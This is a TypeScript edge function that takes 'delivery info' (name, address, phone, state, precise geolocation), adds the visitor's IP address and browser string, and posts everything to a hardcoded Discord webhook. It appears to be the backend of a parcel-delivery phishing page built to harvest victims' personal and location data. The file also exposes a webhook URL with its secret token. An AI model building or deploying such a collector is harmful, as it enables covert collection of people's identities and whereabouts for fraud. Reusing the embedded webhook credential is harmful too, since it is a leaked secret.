import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

interface DeliveryData {
  full_name: string;
  address: string;
  state: string;
  phone: string;
  geolocation?: {
    latitude: number;
    longitude: number;
    accuracy: number;
  };
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const data: DeliveryData = await req.json()
    
    // Get client IP and User-Agent
    const clientIP = req.headers.get('cf-connecting-ip') || 
                    req.headers.get('x-forwarded-for') || 
                    req.headers.get('x-real-ip') || 
                    'Unknown'
    
    const userAgent = req.headers.get('user-agent') || 'Unknown'
    const timestamp = new Date().toISOString()
    
    // Format Discord message
    let discordMessage = `📦 **New Delivery Info Logged**

👤 Name: ${data.full_name}
🏠 Address: ${data.address}`

    if (data.geolocation) {
      discordMessage += `
📍 Geo coordinates: ${data.geolocation.latitude}, ${data.geolocation.longitude} (±${Math.round(data.geolocation.accuracy)}m)`
    }

    discordMessage += `
🌍 State: ${data.state}
📱 Phone: ${data.phone}
🌐 IP: ${clientIP}
🧠 Browser: ${userAgent}
🕒 Time: ${timestamp}`

    // Send to Discord webhook
    const discordWebhook = 'https://discord.com/api/webhooks/1400262069248593960/Jl9j0OLlrE7E306nNqQHvUuYptChlY183O_gK0bSvpSU2swAo2jrSv_n3HyghTO56Cv_'
    
    const discordPayload = {
      content: discordMessage
    }

    const discordResponse = await fetch(discordWebhook, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(discordPayload)
    })

    if (!discordResponse.ok) {
      throw new Error(`Discord webhook failed: ${discordResponse.status}`)
    }

    return new Response(
      JSON.stringify({ success: true, message: 'Data logged successfully' }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200,
      },
    )
  } catch (error) {
    console.error('Error:', error)
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500,
      },
    )
  }
})